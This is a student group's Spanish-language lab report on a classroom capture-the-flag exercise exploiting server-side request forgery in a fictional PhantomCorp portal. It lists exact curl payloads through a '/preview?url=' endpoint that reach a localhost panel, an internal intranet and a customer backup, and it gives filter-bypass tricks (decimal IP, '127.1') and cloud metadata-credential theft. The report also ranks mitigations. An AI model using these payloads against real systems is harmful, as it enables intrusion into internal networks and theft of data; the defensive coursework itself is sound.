# Entregable — Lab Extra SSRF

> Copiá este archivo a `entregas/labextra/grupoXX/informe.md` y completalo.
> Reemplazá `XX` por tu número de grupo.

**Grupo:** XX · **Integrantes:** (apellido, nombre — usuario de GitHub)

**Declaración de uso de IA:**

- **Herramienta:** Claude Code (asistente de IA de línea de comandos, modelo
  Claude Haiku 5.5).
- **Para qué se usó:** consulta y ayuda para entender el enunciado, la
  topología de redes segmentadas del entorno y la sintaxis de `curl`,
  `docker compose` y el flujo de `./ctf`.
- **Trabajo en equipo:** la prueba y error del laboratorio se hizo en equipo,
  en reuniones grupales, con ayuda conjunta de los compañeros.
- **Ejecución asistida:** a pedido del grupo, el asistente levantó el entorno
  (`docker compose`, porque `make` no está instalado en la PC), luego el equipo ejecutó los
  comandos de R1 a R3 desde la consola del atacante y envió las flags con
  `./ctf submit`. Los comandos y salidas de la sección 1 son los de esa
  ejecución.
- **Verificación:** cada salida se tomó de la ejecución real y las flags
  fueron aceptadas por `./ctf submit`, lo que se ve en `./ctf status extra`
  (3/3). las preguntas P1–P5 y la conclusión las redactó el grupo
  y las revisó contra el enunciado

---

## 1. Cadena de explotación

Para cada reto: el razonamiento, el/los comandos exactos (desde `make shell`)
y la salida relevante que prueba el hallazgo.

### R1 — Panel interno en localhost

- **Funcionalidad vulnerable:** el portal público tiene una herramienta de
  previsualización de URLs (`/preview?url=`). El servidor hace la petición
  desde su propia posición de red, sin validar el destino.
- **Puerto del panel:** el puerto 9000 lo tomamos del código fuente del
  servidor (`labs/labextra-ssrf/entorno/web/server.py`), que está en el repo
  de la cátedra. Eso no es un descubrimiento real desde la consola: en un caso
  real habría que sondear puertos. Lo hicimos así para verificar el
  comportamiento de la respuesta. Cada puerto se pidió por medio del SSRF y la
  respuesta del servidor distingue abierto de cerrado:

  ```bash
  docker exec cyberlab-attacker curl -s --max-time 8 "http://phantomcorp/preview?url=http://127.0.0.1:9001/"
  # No pude traer http://127.0.0.1:9001/: <urlopen error [Errno 111] Connection refused>
  ```

  Con el puerto 9001 (cerrado) el servidor devuelve `Connection refused`. Con
  el 9000 (abierto) devuelve el contenido del panel.

- **Comando + salida con la flag:**

  ```bash
  docker exec cyberlab-attacker curl -s --max-time 8 "http://phantomcorp/preview?url=http://127.0.0.1:9000/"
  ```

  ```
  <h2>PhantomCorp — Panel interno (solo localhost)</h2>
  <p>Deploy key: <b>FLAG{ssrf_localhost_panel_interno}</b></p>
  ```

- **Entrega:** `./ctf submit extra R1 'FLAG{ssrf_localhost_panel_interno}'`
  → "Reto R1 resuelto". `./ctf status extra` muestra R1 en ✓ (1/3).

### R2 — Intranet en la red interna

- **Nombre del host:** el enunciado ya menciona `phantomcorp-intra` (la
  prueba de conectividad del README). Antes de usarlo probamos otros nombres
  candidatos por el SSRF; todos respondieron con un error de resolución de
  nombre, y sólo el nombre del enunciado respondió:

  ```bash
  docker exec cyberlab-attacker curl -s --max-time 6 "http://phantomcorp/preview?url=http://phantomcorp-internal/"
  # No pude traer http://phantomcorp-internal/: <urlopen error [Errno -2] Name or service not known>
  docker exec cyberlab-attacker curl -s --max-time 6 "http://phantomcorp/preview?url=http://intranet/"
  # No pude traer http://intranet/: <urlopen error [Errno -2] Name or service not known>
  ```

- **Comando + salida con la flag:**

  ```bash
  docker exec cyberlab-attacker curl -s --max-time 6 "http://phantomcorp/preview?url=http://phantomcorp-intra/"
  ```

  ```
  <h1>Intranet PhantomCorp</h1>
  <p><b>USO INTERNO.</b> ...</p>
  <p>Host: <b>FLAG{ssrf_intranet_descubierta}</b></p>
  ```

- **Entrega:** `./ctf submit extra R2 'FLAG{ssrf_intranet_descubierta}'`
  → "Reto R2 resuelto". `./ctf status extra` muestra 2/3.
- Nota: la intranet ya expone enlaces como `/backups/clientes.json`, que es
  el punto de partida de R3.

### R3 — Exfiltración del backup

- **Recorrido dentro de la intranet:** desde la raíz
  (`http://phantomcorp-intra/`) el HTML listaba dos enlaces: `/backups/clientes.json`
  («temporal, borrar!») y `/salud`. Pedimos el backup por el mismo SSRF.

  ```bash
  docker exec cyberlab-attacker curl -s --max-time 6 "http://phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json"
  ```

  ```
  {
    "_aviso": "backup temporal pre-migracion. NO deberia ser accesible.",
    "clientes": [ ...2 registros de clientes (datos redactados)... ],
    "integridad": "FLAG{ssrf_backup_clientes}"
  }
  ```

- **Entrega:** `./ctf submit extra R3 'FLAG{ssrf_backup_clientes}'`
  → "Reto R3 resuelto". `./ctf status extra` muestra 3/3 y "Lab extra COMPLETO".
- **Datos sensibles:** el backup tenía registros de clientes con razón social
  y CUIT. Los datos se redactan en el informe; no se reproducen completos. El
  archivo indicaba explícitamente que no debía ser accesible, y estaba
  publicado en la intranet sin autenticación.

## 2. Evidencia de progreso

```
   ✓  R1     El server fetchea por vos: panel interno en localhost
   ✓  R2     Descubrir la intranet en la red interna
   ✓  R3     Exfiltrar datos sensibles a traves del SSRF

  ██████████████████████████████  3/3 (100%)

[ OK ] ¡Lab extra COMPLETO! Ponete las pilas con la próxima unidad.
```

## 3. Preguntas de análisis

**P1. Por qué "la intranet no es alcanzable desde afuera" dejó de ser cierta.**
La frase supone que la red es el límite de confianza. Pero el servidor web
(`phantomcorp`) está conectado a dos redes: `labnet`, donde está el atacante,
e `internalnet`, donde está la intranet. El atacante no tiene ruta a la
intranet, pero el servidor web sí, y lo que la hizo alcanzable fue
`/preview`: un componente que fetchea URLs sin validar el destino. La
segmentación protege contra conexiones directas, no contra pedidos hechos por
un intermediario que sí tiene acceso.

**P2. Oráculo de escaneo.** Con `127.0.0.1:9001` (cerrado) la respuesta fue
`Connection refused` (errno 111); con `127.0.0.1:9000` (abierto) devolvió el
contenido del panel. El error de conexión revela el estado del puerto. Lo
mismo con los hosts: `Name or service not known` (errno -2) indica que el
nombre no existe, distinto de un host que existe pero no responde. Es un
oráculo porque el atacante distingue puertos y hosts internos sin tener acceso
a ellos. Mitigación: que el error sea genérico y no distinga estados.

**P3. Hallazgo profesional.**
- **Activo afectado:** portal público de PhantomCorp (`/preview`) e intranet
  `phantomcorp-intra`.
- **Vector:** SSRF (CWE-918) en el parámetro `url` de `/preview`, sin
  autenticación.
- **Impacto:** lectura de un panel interno en localhost (una clave de
  despliegue), acceso a la intranet y exfiltración de un backup temporal de
  clientes con razón social y CUIT. El propio archivo decía que no debía ser
  accesible.
- **Evidencia:** comandos y salidas de la sección 1 (R1 a R3).
- **Severidad:** alta. No requiere autenticación y expone datos de clientes.

**P4. Mitigaciones, de mejor a peor.**
1. **Allowlist de destinos:** permitir solo hosts y esquemas explícitos. Es la
   más sólida porque reduce lo que el servidor puede pedir. Limitación: hay
   que mantener la lista, y si el caso de uso necesita destinos dinámicos, la
   lista queda incompleta.
2. **Validar la IP resuelta antes de conectar:** bloquear loopback y rangos
   privados (127/8, 10/8, 172.16/12, 192.168/16, 169.254/16), y fijar la IP
   validada para la conexión (DNS pinning) para evitar DNS rebinding.
   Limitación: hay que validar la IP realmente usada, no la del primer lookup,
   y las redirecciones pueden llevar a un destino interno.
3. **Filtrar strings** (`localhost`, `127.0.0.1`). Es la peor: no alcanza.
   `http://2130706433/` (IP decimal), `http://127.1/` o un dominio público que
   resuelve a 127.0.0.1 eluden el filtro.

Complementario: que la red del servidor web no alcance la intranet salvo que
sea necesario, y que `/preview` no devuelva el contenido crudo ni errores
detallados.

**P5. Metadata service.** `169.254.169.254` es la dirección link-local donde
las nubes (AWS, GCP, Azure) exponen metadatos de cada instancia, incluidas las
credenciales temporales del rol IAM asignado. Un SSRF en una app cloud permite
pedir esa dirección desde el servidor y obtener esas credenciales, que dan
acceso a la cuenta con los permisos del rol. Es mucho más grave que en el lab
porque no hace falta llegar a la red interna: el endpoint responde a la propia
instancia, y el impacto escala a toda la cuenta (como en Capital One, 2019).
En AWS, IMDSv2 exige un token previo por PUT con header, lo que dificulta el
SSRF de un solo GET.

## 4. Conclusión

PhantomCorp tiene una vulnerabilidad de SSRF en la herramienta de
previsualización de su portal público. Sin autenticación, pudimos leer un
panel de administración que sólo escucha en localhost, llegar a una intranet
que se consideraba fuera de alcance y descargar un backup temporal con datos
de clientes que nunca debía estar accesible. La segmentación de red no
protegió la intranet, porque el propio servidor web puede alcanzarla.
Recomendamos de inmediato retirar el backup, rotar la clave de despliegue
expuesta, restringir `/preview` a una allowlist de destinos, bloquear destinos
internos y de loopback, y revisar si las instancias cloud tienen el metadata
service accesible sin IMDSv2. Es una corrección prioritaria.
